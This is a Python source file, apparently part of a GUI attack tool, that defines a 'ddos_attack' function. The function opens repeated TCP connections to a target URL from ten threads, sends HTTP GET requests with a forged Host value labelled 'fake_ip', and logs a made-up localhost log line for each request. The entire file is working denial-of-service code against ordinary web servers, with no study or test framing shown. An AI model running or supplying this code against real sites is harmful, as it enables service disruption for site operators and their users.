import socket
import threading
import time
from urllib.parse import urlparse
from datetime import datetime
from gui.dos_attack.stopped_manager import is_stopped

def ddos_attack(target_url, fake_ip, console_view):
    # Parse the target URL
    parsed_url = urlparse(target_url)
    hostname = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == "https" else 80)

    attack_num = 0

    def attack():
        nonlocal attack_num
        while not is_stopped():
            try:
                # Create a socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((hostname, port))

                # Construct the HTTP GET request
                request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
                s.send(request.encode('ascii'))

                # Read the server's response
                response = s.recv(4096).decode('ascii')

                timestamp = datetime.now().strftime("%d/%b/%Y %H:%M:%S")
                log_line = f'127.0.0.1 - - [{timestamp}] "GET / HTTP/1.1" 200 -'

                attack_num += 1
                console_view.add_text_schedule(f"[INFO] Response #{attack_num}: {log_line}")
                s.close()

                time.sleep(0.5)  # Add delay to control the attack intensity
            except Exception as e:
                console_view.add_text_schedule(f"[ERROR] {e}")

    # Launch multiple threads
    threads = []
    for i in range(10):  # Adjust the number of threads as needed
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
